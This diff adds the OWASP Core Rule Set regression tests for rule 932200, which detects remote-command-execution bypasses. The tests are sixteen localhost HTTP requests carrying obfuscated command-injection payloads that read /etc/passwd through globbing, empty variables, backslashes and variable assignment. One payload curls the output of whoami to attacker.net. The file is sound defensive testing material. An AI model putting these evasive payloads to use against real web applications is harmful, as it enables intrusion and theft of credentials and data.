@@ -1,0 +1,266 @@
+---
+meta:
+  author: "theMiddle, Franziska Bühler, Max Leske"
+  description: RCE Bypass
+  enabled: true
+  name: 932200.yaml
+tests:
+  - test_title: 932200-1
+    desc: globbing patterns
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;/bin/ca?+/et*/passwd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-2
+    desc: uninitialized variable
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;cat+/etc/%24%7Ba%7Dpasswd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-3
+    desc: bash function
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;cat+/etc/%24%28echo%29passwd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-4
+    desc: uninitialized vars
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;c%24%40at%2B%2Fet%24%40c%2Fpas%24%40swd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-5
+    desc: uninitialized vars
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;c%24%21at%2B%2Fet%24%21c%2Fpas%24%21swd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-6
+    desc: uninitialized vars
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;c%24%2Aat%2B%2Fet%24%2Ac%2Fpas%24%2Aswd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-7
+    desc: uninitialized vars
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;c%24%3Fat%2B%2Fet%24%3Fc%2Fpas%24%3Fswd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-8
+    desc: uninitialized vars
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;c%24-at%2B%2Fet%24-c%2Fpas%24-swd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-9
+    desc: uninitialized vars
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;c%24_at%2B%2Fet%24_c%2Fpas%24_swd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-10
+    desc: uninitialized vars
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;c%24%24at%2B%2Fet%24%24c%2Fpas%24%24swd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-11
+    desc: "Test first backslash match ([*?`\\'][^/\n]+/) with: c\at /etc/passwd"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;c%5Cat%20%2Fetc%2Fpasswd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-12
+    desc: "Test second backslash match (/[^/]+?[*?`\\']) with: cat /etc/p\asswd"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;cat%20%2Fetc%2Fp%5Casswd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-13
+    desc: "Test correct logging"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /?host=www.google.com;/bin/ca?+/et*/passwd
+            version: HTTP/1.0
+          output:
+            no_log_contains: found within MATCHED_VAR
+  - test_title: 932200-14
+    desc: "Test variable assignment ('cat /etc/passwd' assigned via individual variables, cat in reverse order)"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            data: exec=c4%3D%5C%20%3Bc3%3Dt%3Bc2%3Da%3Bc1%3Dc%3Ba1%3D%2F%3Ba2%3De%3Ba3%3Dt%3Ba4%3Dc%3Ba5%3D%2F%3Ba6%3Dp%3Ba7%3Da%3Ba8%3Ds%3Ba9%3Ds%3Ba10%3Dw%3Ba11%3Dd%3B%24c1%24c2%24c3%24c4%24a1%24a2%24a3%24a4%24a5%24a6%24a7%24a8%24a9%24a10%24a11%0A
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: POST
+            port: 80
+            uri: /
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-15
+    desc: "Add test to match BB EBIDJ91T"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            data: cmd%3Da%3Dcurl%26%26b%3D%60whoami%60%26%26%24a%20attacker.net%2F%24b
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: POST
+            port: 80
+            uri: /
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
+  - test_title: 932200-16
+    desc: "Add test to match BB MKXQCJMX"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            data: cmd=a%3D%2Fetc%26%26b%3D%2Fpasswd%26%26c%3Dcat%26%26%24c%20%24a%24b
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+            method: POST
+            port: 80
+            uri: /
+            version: HTTP/1.0
+          output:
+            log_contains: id "932200"
